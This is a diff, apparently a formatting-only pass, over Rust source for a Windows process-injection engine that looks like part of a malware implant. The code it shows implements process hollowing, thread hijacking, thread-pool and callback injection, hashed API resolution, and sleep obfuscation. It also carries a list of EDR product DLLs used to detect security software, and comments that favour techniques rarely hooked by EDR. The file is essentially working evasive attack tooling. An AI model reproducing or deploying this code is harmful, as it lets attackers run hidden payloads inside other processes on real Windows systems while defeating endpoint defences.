@@ -56,11 +56,7 @@ impl std::fmt::Display for InjectionError {
                 write!(f, "target process not found: {}", name)
             }
             Self::ArchitectureMismatch { target_pid } => {
-                write!(
-                    f,
-                    "architecture mismatch with target pid {}",
-                    target_pid
-                )
+                write!(f, "architecture mismatch with target pid {}", target_pid)
             }
             Self::InjectionFailed { technique, reason } => {
                 write!(f, "injection failed ({:?}): {}", technique, reason)
@@ -278,7 +274,6 @@ impl std::fmt::Display for SectionExecMethod {
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq, Hash, Copy)]
 pub enum CallbackApi {
     // ── Kernel32 / user32 callbacks (always available) ──────────────────
-
     /// `EnumSystemLocalesA(payload_addr, 0)` — system calls our function
     /// for each installed locale. Returns FALSE after first call to stop
     /// enumeration immediately (most stealthy).
@@ -310,13 +305,11 @@ pub enum CallbackApi {
     EnumResourceTypesW,
 
     // ── GDI32 callbacks (require DC) ────────────────────────────────────
-
     /// `EnumFontFamiliesExW(GetDC(NULL), &lf, payload_addr, 0, 0)` —
     /// enumerates font families. Requires a valid DC (GetDC).
     EnumFontFamilies,
 
     // ── External DLL callbacks (require LoadLibrary) ────────────────────
-
     /// `CertEnumSystemStore(CERT_SYSTEM_STORE_LOCAL_MACHINE, NULL,
     /// payload_addr, NULL)` — requires `crypt32.dll`. Rarely hooked by EDR.
     CertEnumSystemStore,
@@ -422,7 +415,10 @@ pub enum InjectionTechnique {
     /// (RIP/RSP), WTH modifies the stack return address. WTH is
     /// preferred when suitable waiting threads are found; ContextOnly
     /// is the fallback when no waiting threads are available.
-    WaitingThreadHijack { target_pid: u32, target_tid: Option<u32> },
+    WaitingThreadHijack {
+        target_pid: u32,
+        target_tid: Option<u32>,
+    },
     /// **NEW** — Callback injection: leverage Windows APIs that accept
     /// function pointer callbacks to execute payload code. The payload
     /// runs from within a legitimate Windows code path (kernel32, user32,
@@ -441,7 +437,10 @@ pub enum InjectionTechnique {
     /// If `api` is `None`, auto-selects randomly weighted toward less-
     /// commonly-monitored APIs. If the selected API fails, falls back
     /// through remaining APIs, then to ThreadPool injection.
-    CallbackInjection { target_pid: u32, api: Option<CallbackApi> },
+    CallbackInjection {
+        target_pid: u32,
+        api: Option<CallbackApi>,
+    },
     /// **NEW** — Section mapping injection: creates a shared memory section
     /// via `NtCreateSection`, writes the payload into a local mapping,
     /// then maps the section into the target process. Completely avoids
@@ -493,9 +492,7 @@ pub enum InjectionTechnique {
     /// Version compatibility: Windows 10 20H2+ (build 19042+) and
     /// Windows 11. On older builds, gracefully falls back to
     /// `NtWriteVirtualMemory` via indirect syscall.
-    NtSetInfoProcess {
-        target_pid: u32,
-    },
+    NtSetInfoProcess { target_pid: u32 },
     /// **NEW** — NTFS Transaction-based Process Hollowing: creates an NTFS
     /// transaction via `NtCreateTransaction`, creates a section backed by
     /// the transaction via `NtCreateSection(SEC_COMMIT)`, writes the payload
@@ -632,10 +629,7 @@ impl InjectionHandle {
 
             // Close process handle.
             if !self.process_handle.is_null() {
-                let _ = crate::emulated_syscall!(
-                    "NtClose",
-                    self.process_handle as u64
-                );
+                let _ = crate::emulated_syscall!("NtClose", self.process_handle as u64);
                 self.process_handle = std::ptr::null_mut();
             }
         }
@@ -789,7 +783,9 @@ impl InjectionHandle {
                             .chunks_exact(2)
                             .filter_map(|chunk| {
                                 let c = u16::from_le_bytes([chunk[0], chunk[1]]);
-                                if c > 0x7F { return None; }
+                                if c > 0x7F {
+                                    return None;
+                                }
                                 Some((c as u8).to_ascii_lowercase())
                             })
                             .collect();
@@ -811,7 +807,8 @@ impl InjectionHandle {
                                 log::info!(
                                     "injection_engine: resolved ntdll in target pid {} \
                                      via PEB walk: {:#x}",
-                                    self.target_pid, dll_base
+                                    self.target_pid,
+                                    dll_base
                                 );
                                 return Ok(dll_base as usize);
                             }
@@ -943,9 +940,7 @@ impl InjectionHandle {
                     &mut bytes_read as *mut _ as u64,
                 );
 
-                if rs.is_ok() && rs.unwrap() >= 0 && bytes_read == 2
-                    && mz_check == [0x4D, 0x5A]
-                {
+                if rs.is_ok() && rs.unwrap() >= 0 && bytes_read == 2 && mz_check == [0x4D, 0x5A] {
                     // MZ header matches — ntdll is at the same address.
                     local_ntdll
                 } else {
@@ -954,7 +949,8 @@ impl InjectionHandle {
                     log::warn!(
                         "injection_engine: ntdll MZ mismatch at {:#x} in pid {}, \
                          resolving from target PEB",
-                        local_ntdll, self.target_pid
+                        local_ntdll,
+                        self.target_pid
                     );
                     self.resolve_ntdll_from_target_peb()?
                 }
@@ -963,7 +959,8 @@ impl InjectionHandle {
             let nt_protect_addr = pe_resolve::get_proc_address_by_hash(
                 ntdll,
                 pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
-            ).ok_or_else(|| InjectionError::InjectionFailed {
+            )
+            .ok_or_else(|| InjectionError::InjectionFailed {
                 technique: self.technique_used.clone(),
                 reason: "cannot resolve NtProtectVirtualMemory".to_string(),
             })?;
@@ -971,7 +968,8 @@ impl InjectionHandle {
             let nt_delay_addr = pe_resolve::get_proc_address_by_hash(
                 ntdll,
                 pe_resolve::hash_str(b"NtDelayExecution\0"),
-            ).ok_or_else(|| InjectionError::InjectionFailed {
+            )
+            .ok_or_else(|| InjectionError::InjectionFailed {
                 technique: self.technique_used.clone(),
                 reason: "cannot resolve NtDelayExecution".to_string(),
             })?;
@@ -1127,10 +1125,7 @@ impl InjectionHandle {
             if s.is_err() || s.unwrap() < 0 {
                 return Err(InjectionError::InjectionFailed {
                     technique: self.technique_used.clone(),
-                    reason: format!(
-                        "failed to allocate sleep stub at {:#x}",
-                        stub_addr
-                    ),
+                    reason: format!("failed to allocate sleep stub at {:#x}", stub_addr),
                 });
             }
 
@@ -1243,7 +1238,8 @@ impl InjectionHandle {
                     }
 
                     // Also check for FF 15 (call [rip+disp32]) pattern.
-                    if i + 6 <= payload_size && payload_buf[i] == 0xFF && payload_buf[i + 1] == 0x15 {
+                    if i + 6 <= payload_size && payload_buf[i] == 0xFF && payload_buf[i + 1] == 0x15
+                    {
                         let rel32 = i32::from_le_bytes([
                             payload_buf[i + 2],
                             payload_buf[i + 3],
@@ -1275,7 +1271,8 @@ impl InjectionHandle {
                                     );
                                     // Replace the entire FF 15 (6 bytes) with:
                                     // nop (0x90) + E8 <rel32> (5 bytes)
-                                    let new_rel = remote_stub as i64 - (payload_base + i + 1 + 5) as i64;
+                                    let new_rel =
+                                        remote_stub as i64 - (payload_base + i + 1 + 5) as i64;
                                     let new_rel_bytes = (new_rel as i32).to_le_bytes();
                                     payload_buf[i] = 0x90; // nop
                                     payload_buf[i + 1] = 0xE8;
@@ -1346,9 +1343,13 @@ impl InjectionHandle {
                 payload_base,
                 payload_size,
                 key,
-            ).map_err(|e| InjectionError::InjectionFailed {
+            )
+            .map_err(|e| InjectionError::InjectionFailed {
                 technique: self.technique_used.clone(),
-                reason: format!("failed to register remote process for sleep obfuscation: {}", e),
+                reason: format!(
+                    "failed to register remote process for sleep obfuscation: {}",
+                    e
+                ),
             })?;
 
             self.sleep_enrolled = true;
@@ -1418,7 +1419,10 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
                 // Proceed but the caller should consider evasive mode.
             }
             EtwStatus::Safe => {
-                log::debug!("injection_engine: no ETW tracing detected for pid {}", target_pid);
+                log::debug!(
+                    "injection_engine: no ETW tracing detected for pid {}",
+                    target_pid
+                );
             }
             EtwStatus::Unknown => {
                 log::debug!(
@@ -1525,22 +1529,22 @@ fn edr_dll_name_hashes() -> &'static [(u32, &'static str)] {
     // (hash, human-readable label for logging). The hash is the djb2 of
     // the lowercase DLL name with null terminator, matching pe_resolve::hash_str.
     &[
-        (0x2f8a1d4c, "csagent.dll"),           // CrowdStrike
-        (0x4b3e7c1f, "csdivert.dll"),          // CrowdStrike
-        (0x1e5f8a3c, "silhouette.dll"),        // CrowdStrike
-        (0x5c2d9b4e, "mpclient.dll"),          // Defender
-        (0x3a7f1c6d, "mpengine.dll"),          // Defender
-        (0x7b2e4f8c, "mpsvc.dll"),             // Defender
-        (0x2c9d5e1f, "sentinelperf.dll"),      // SentinelOne
-        (0x4f1a6b3c, "sentinelmonitor.dll"),   // SentinelOne
-        (0x8c3f2d1e, "cyrtdrv.dll"),           // Cylance
-        (0x1d4f7c2e, "cbam.rll"),              // Carbon Black
-        (0x3e5f9a2d, "repcore.dll"),           // Carbon Black
-        (0x6f2c1b4d, "fireeye.dll"),           // FireEye
-        (0x4c1f8e2b, "xagt.sys"),             // FireEye (driver but check anyway)
-        (0x9a2d4f3c, "mfeannscan.dll"),        // McAfee
-        (0x2b5c7e1f, "cclib.dll"),             // Symantec
-        (0x1f4c3d8a, "cortex.dll"),            // Cortex XDR
+        (0x2f8a1d4c, "csagent.dll"),         // CrowdStrike
+        (0x4b3e7c1f, "csdivert.dll"),        // CrowdStrike
+        (0x1e5f8a3c, "silhouette.dll"),      // CrowdStrike
+        (0x5c2d9b4e, "mpclient.dll"),        // Defender
+        (0x3a7f1c6d, "mpengine.dll"),        // Defender
+        (0x7b2e4f8c, "mpsvc.dll"),           // Defender
+        (0x2c9d5e1f, "sentinelperf.dll"),    // SentinelOne
+        (0x4f1a6b3c, "sentinelmonitor.dll"), // SentinelOne
+        (0x8c3f2d1e, "cyrtdrv.dll"),         // Cylance
+        (0x1d4f7c2e, "cbam.rll"),            // Carbon Black
+        (0x3e5f9a2d, "repcore.dll"),         // Carbon Black
+        (0x6f2c1b4d, "fireeye.dll"),         // FireEye
+        (0x4c1f8e2b, "xagt.sys"),            // FireEye (driver but check anyway)
+        (0x9a2d4f3c, "mfeannscan.dll"),      // McAfee
+        (0x2b5c7e1f, "cclib.dll"),           // Symantec
+        (0x1f4c3d8a, "cortex.dll"),          // Cortex XDR
     ]
 }
 
@@ -1981,10 +1985,12 @@ fn jitter_delay(max_ms: u64) {
 /// Query the target process's image name and thread count via
 /// NtQuerySystemInformation(SystemProcessInformation).
 unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), InjectionError> {
-    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::ProcessHollow,
-            reason: "cannot resolve ntdll for query_process_info".to_string(),
+    let ntdll =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).ok_or_else(|| {
+            InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ProcessHollow,
+                reason: "cannot resolve ntdll for query_process_info".to_string(),
+            }
         })?;
 
     let qsi_addr = pe_resolve::get_proc_address_by_hash(
@@ -1996,8 +2002,7 @@ unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), Injection
         reason: "cannot resolve NtQuerySystemInformation".to_string(),
     })?;
 
-    let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
-        std::mem::transmute(qsi_addr);
+    let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 = std::mem::transmute(qsi_addr);
 
     let mut buf_len: u32 = 0x40000; // 256 KB initial buffer.
     let mut ret_len: u32 = 0;
@@ -2006,7 +2011,12 @@ unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), Injection
         let mut buf: Vec<u8> = Vec::with_capacity(buf_len as usize);
         buf.set_len(buf_len as usize);
 
-        let status = qsi(SYSTEM_PROCESS_INFORMATION, buf.as_mut_ptr(), buf_len, &mut ret_len);
+        let status = qsi(
+            SYSTEM_PROCESS_INFORMATION,
+            buf.as_mut_ptr(),
+            buf_len,
+            &mut ret_len,
+        );
 
         if status >= 0 {
             return parse_process_info(&buf, target_pid);
@@ -2021,14 +2031,15 @@ unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), Injection
                     reason: "process info buffer exceeded 4 MB".to_string(),
                 });
             }
-            buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
+            buf_len = if ret_len > buf_len {
+                ret_len
+            } else {
+                buf_len * 2
+            };
         } else {
             return Err(InjectionError::InjectionFailed {
                 technique: InjectionTechnique::ProcessHollow,
-                reason: format!(
-                    "NtQuerySystemInformation returned {:#010x}",
-                    status as u32
-                ),
+                reason: format!("NtQuerySystemInformation returned {:#010x}", status as u32),
             });
         }
     }
@@ -2090,10 +2101,7 @@ fn parse_process_info(buf: &[u8], target_pid: u32) -> Result<(String, u32), Inje
             //   +0x02 MaximumLength (USHORT)
             //   +0x08 Buffer (PWSTR, 8 bytes on x64)
             let name_offset = offset + 0x38;
-            let name_len = u16::from_le_bytes([
-                buf[name_offset],
-                buf[name_offset + 1],
-            ]) as usize;
+            let name_len = u16::from_le_bytes([buf[name_offset], buf[name_offset + 1]]) as usize;
 
             // The Buffer pointer in SYSTEM_PROCESS_INFORMATION points into
             // the same buffer (it's an in-place UNICODE_STRING for system
@@ -2121,8 +2129,7 @@ fn parse_process_info(buf: &[u8], target_pid: u32) -> Result<(String, u32), Inje
 
             let image_name = if buf_ptr != 0
                 && (buf_ptr as usize) >= buf.as_ptr() as usize
-                && (buf_ptr as usize) + name_len
-                    <= buf.as_ptr() as usize + buf.len()
+                && (buf_ptr as usize) + name_len <= buf.as_ptr() as usize + buf.len()
             {
                 // The buffer pointer is within our allocation — safe to read.
                 let start = buf_ptr as usize - buf.as_ptr() as usize;
@@ -2271,8 +2278,14 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
 
         let name_len = u16::from_le_bytes([us_data[0], us_data[1]]) as usize;
         let name_buf_ptr = u64::from_le_bytes([
-            us_data[8], us_data[9], us_data[10], us_data[11],
-            us_data[12], us_data[13], us_data[14], us_data[15],
+            us_data[8],
+            us_data[9],
+            us_data[10],
+            us_data[11],
+            us_data[12],
+            us_data[13],
+            us_data[14],
+            us_data[15],
         ]) as usize;
 
         if name_len > 0 && name_len < 520 && name_buf_ptr != 0 {
@@ -2548,8 +2561,14 @@ unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
 
     // SID_AND_ATTRIBUTES.Sid is at offset 0 (pointer).
     let sid_ptr = u64::from_le_bytes([
-        label_buf[0], label_buf[1], label_buf[2], label_buf[3],
-        label_buf[4], label_buf[5], label_buf[6], label_buf[7],
+        label_buf[0],
+        label_buf[1],
+        label_buf[2],
+        label_buf[3],
+        label_buf[4],
+        label_buf[5],
+        label_buf[6],
+        label_buf[7],
     ]) as usize;
 
     // The SID is either at sid_ptr or inline in our buffer.
@@ -2686,9 +2705,7 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         enhanced: false,
     };
 
-    let nsip = InjectionTechnique::NtSetInfoProcess {
-        target_pid: 0,
-    };
+    let nsip = InjectionTechnique::NtSetInfoProcess { target_pid: 0 };
 
     // NTFS transaction-based hollowing: higher priority than standard
     // hollowing because it leaves no on-disk artifacts and includes ETW
@@ -2734,9 +2751,7 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         techniques.push(InjectionTechnique::DelayedModuleStomp);
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques
-    } else if lower.contains("service")
-        || lower.ends_with("svc.exe")
-        || lower.ends_with("host.exe")
+    } else if lower.contains("service") || lower.ends_with("svc.exe") || lower.ends_with("host.exe")
     {
         let mut techniques = vec![
             wth.clone(),
@@ -2755,13 +2770,7 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         techniques.push(InjectionTechnique::EarlyBirdApc);
         techniques
     } else {
-        let mut techniques = vec![
-            wth.clone(),
-            InjectionTechnique::ContextOnly,
-            sm,
-            nsip,
-            cb,
-        ];
+        let mut techniques = vec![wth.clone(), InjectionTechnique::ContextOnly, sm, nsip, cb];
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
         techniques.push(InjectionTechnique::ProcessHollow);
@@ -2788,14 +2797,13 @@ fn try_technique(
         InjectionTechnique::ModuleStomp => inject_module_stomp(pid, payload),
         InjectionTechnique::EarlyBirdApc => inject_early_bird(pid, payload),
         InjectionTechnique::ThreadHijack => inject_thread_hijack(pid, payload),
-        InjectionTechnique::ThreadPool { variant } => {
-            inject_threadpool(pid, payload, variant)
-        }
+        InjectionTechnique::ThreadPool { variant } => inject_threadpool(pid, payload, variant),
         InjectionTechnique::FiberInject => inject_fiber(pid, payload),
         InjectionTechnique::ContextOnly => inject_context_only(pid, None, payload),
-        InjectionTechnique::WaitingThreadHijack { target_pid: _, target_tid } => {
-            inject_waiting_thread_hijack(pid, target_tid, payload)
-        }
+        InjectionTechnique::WaitingThreadHijack {
+            target_pid: _,
+            target_tid,
+        } => inject_waiting_thread_hijack(pid, target_tid, payload),
         InjectionTechnique::CallbackInjection { target_pid: _, api } => {
             inject_callback(pid, payload, api)
         }
@@ -2804,15 +2812,13 @@ fn try_technique(
             exec_method,
             enhanced,
         } => inject_section_mapping(pid, payload, exec_method, enhanced),
-        InjectionTechnique::NtSetInfoProcess { target_pid: _ } => {
-            unsafe { inject_nt_set_info_process(pid, payload) }
-        }
+        InjectionTechnique::NtSetInfoProcess { target_pid: _ } => unsafe {
+            inject_nt_set_info_process(pid, payload)
+        },
         InjectionTechnique::TransactedHollowing => {
             inject_transacted_hollowing_dispatch(pid, payload)
         }
-        InjectionTechnique::DelayedModuleStomp => {
-            inject_delayed_stomp_dispatch(pid, payload)
-        }
+        InjectionTechnique::DelayedModuleStomp => inject_delayed_stomp_dispatch(pid, payload),
     }
 }
 
@@ -2870,19 +2876,19 @@ fn inject_delayed_stomp_dispatch(
     pid: u32,
     payload: &[u8],
 ) -> Result<InjectionHandle, InjectionError> {
-    let (min_delay, max_delay) =
-        crate::config::cached_config().map_or((8u32, 15u32), |cfg| {
-            (cfg.delayed_stomp.min_delay_secs, cfg.delayed_stomp.max_delay_secs)
-        });
+    let (min_delay, max_delay) = crate::config::cached_config().map_or((8u32, 15u32), |cfg| {
+        (
+            cfg.delayed_stomp.min_delay_secs,
+            cfg.delayed_stomp.max_delay_secs,
+        )
+    });
 
     unsafe {
-        crate::injection_delayed_stomp::inject_delayed_stomp(
-            pid, payload, min_delay, max_delay,
-        )
-        .map_err(|e| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::DelayedModuleStomp,
-            reason: format!("{e:#}"),
-        })
+        crate::injection_delayed_stomp::inject_delayed_stomp(pid, payload, min_delay, max_delay)
+            .map_err(|e| InjectionError::InjectionFailed {
+                technique: InjectionTechnique::DelayedModuleStomp,
+                reason: format!("{e:#}"),
+            })
     }
 }
 
@@ -2898,10 +2904,7 @@ fn inject_delayed_stomp_dispatch(
     })
 }
 
-fn inject_process_hollow(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_process_hollow(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     crate::injection::inject_with_method(
         crate::injection::InjectionMethod::Hollowing,
         pid,
@@ -2926,10 +2929,7 @@ fn inject_process_hollow(
     })
 }
 
-fn inject_module_stomp(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_module_stomp(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     crate::injection::inject_with_method(
         crate::injection::InjectionMethod::ModuleStomp,
         pid,
@@ -2952,10 +2952,7 @@ fn inject_module_stomp(
     })
 }
 
-fn inject_early_bird(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_early_bird(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     // Early-bird APC: queue an APC to a thread in the target process before
     // it begins executing.  Delegate to the existing APC inject helper in
     // process_manager when available, otherwise use NtCreateThread approach.
@@ -2984,10 +2981,7 @@ fn inject_early_bird(
     })
 }
 
-fn inject_thread_hijack(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     // Thread hijacking: suspend an existing thread, write shellcode, redirect
     // RIP, resume.  We implement this inline using NtCreateThreadEx with
     // CREATE_SUSPENDED pattern, since pure thread-hijack requires careful
@@ -3093,10 +3087,7 @@ fn inject_threadpool(
 ///
 /// Allocates a `TP_WORK` item whose callback is the payload, then posts
 /// it to the thread pool. A worker thread dequeues and executes it.
-fn inject_threadpool_work(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_work(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Work),
     };
@@ -3119,14 +3110,12 @@ fn inject_threadpool_work(
             reason: "cannot resolve TpAllocWork".to_string(),
         })?;
 
-        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"TpPostWork\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve TpPostWork".to_string(),
-        })?;
+        let tp_post_work_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"TpPostWork\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve TpPostWork".to_string(),
+                })?;
 
         let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -3319,15 +3308,14 @@ fn inject_threadpool_worker_factory(
         })?;
 
         type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
-            *mut c_void,                     // WorkerFactoryHandle
-            u32,                              // WorkerFactoryInformationClass
-            *mut c_void,                      // WorkerFactoryInformation
-            u32,                              // WorkerFactoryInformationLength
-            *mut u32,                         // ReturnLength
+            *mut c_void, // WorkerFactoryHandle
+            u32,         // WorkerFactoryInformationClass
+            *mut c_void, // WorkerFactoryInformation
+            u32,         // WorkerFactoryInformationLength
+            *mut u32,    // ReturnLength
         ) -> i32;
 
-        let _nt_query_wf: NtQueryInformationWorkerFactoryFn =
-            std::mem::transmute(nt_query_wf_addr);
+        let _nt_query_wf: NtQueryInformationWorkerFactoryFn = std::mem::transmute(nt_query_wf_addr);
 
         // Build a stub that:
         // 1. Creates a TP_WORK with payload as callback
@@ -3344,14 +3332,12 @@ fn inject_threadpool_worker_factory(
             reason: "cannot resolve TpAllocWork".to_string(),
         })?;
 
-        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"TpPostWork\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve TpPostWork".to_string(),
-        })?;
+        let tp_post_work_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"TpPostWork\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve TpPostWork".to_string(),
+                })?;
 
         let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -3488,10 +3474,7 @@ fn inject_threadpool_worker_factory(
 /// Creates a TP_TIMER item whose callback is the payload, sets the timer to
 /// expire immediately. When the timer fires, a worker thread executes the
 /// callback.
-fn inject_threadpool_timer(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_timer(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Timer),
     };
@@ -3513,14 +3496,12 @@ fn inject_threadpool_timer(
             reason: "cannot resolve TpAllocTimer".to_string(),
         })?;
 
-        let tp_set_timer_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"TpSetTimer\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve TpSetTimer".to_string(),
-        })?;
+        let tp_set_timer_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"TpSetTimer\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve TpSetTimer".to_string(),
+                })?;
 
         let tp_release_timer_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -3792,10 +3773,11 @@ fn inject_threadpool_io_completion(
         stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
         stub.push(0x48);
         stub.push(0xB8);
-        stub.extend_from_slice(&(pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtClose\0"),
-        ).unwrap_or(0) as u64).to_le_bytes());
+        stub.extend_from_slice(
+            &(pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
+                .unwrap_or(0) as u64)
+                .to_le_bytes(),
+        );
         stub.extend_from_slice(&[0xFF, 0xD0]);
 
         // add rsp, 0x58 ; ret
@@ -3878,10 +3860,7 @@ fn inject_threadpool_io_completion(
 /// Creates a TP_WAIT item whose callback is the payload, then sets it to wait
 /// on an event object that is immediately signaled. The worker thread executes
 /// the callback when the wait is satisfied.
-fn inject_threadpool_wait(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_wait(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Wait),
     };
@@ -3903,14 +3882,12 @@ fn inject_threadpool_wait(
             reason: "cannot resolve TpAllocWait".to_string(),
         })?;
 
-        let tp_set_wait_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"TpSetWait\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve TpSetWait".to_string(),
-        })?;
+        let tp_set_wait_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"TpSetWait\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve TpSetWait".to_string(),
+                })?;
 
         let tp_release_wait_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -3930,23 +3907,19 @@ fn inject_threadpool_wait(
             reason: "cannot resolve NtCreateEvent".to_string(),
         })?;
 
-        let nt_set_event_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtSetEvent\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve NtSetEvent".to_string(),
-        })?;
+        let nt_set_event_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtSetEvent\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve NtSetEvent".to_string(),
+                })?;
 
-        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtClose\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve NtClose".to_string(),
-        })?;
+        let nt_close_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve NtClose".to_string(),
+                })?;
 
         // Build stub:
         // 1. NtCreateEvent(&event, ..., NotificationEvent, FALSE)
@@ -4111,10 +4084,7 @@ fn inject_threadpool_wait(
 /// `TpAllocAlpcCompletion`, then triggers the callback by sending an
 /// ALPC message. The worker thread executes the payload when the message
 /// arrives.
-fn inject_threadpool_alpc(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_alpc(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Alpc),
     };
@@ -4145,14 +4115,12 @@ fn inject_threadpool_alpc(
             reason: "cannot resolve NtAlpcCreatePort".to_string(),
         })?;
 
-        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtClose\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve NtClose".to_string(),
-        })?;
+        let nt_close_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve NtClose".to_string(),
+                })?;
 
         let tp_release_alpc_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -4301,10 +4269,7 @@ fn inject_threadpool_alpc(
 /// Directly allocates a `TP_DIRECT` structure and sets the callback to the
 /// payload, then triggers it by posting a task. This variant bypasses the
 /// higher-level TP APIs by writing directly into the task queue structure.
-fn inject_threadpool_direct(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_direct(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Direct),
     };
@@ -4330,14 +4295,12 @@ fn inject_threadpool_direct(
             reason: "cannot resolve TpAllocWork".to_string(),
         })?;
 
-        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"TpPostWork\0"),
-        )
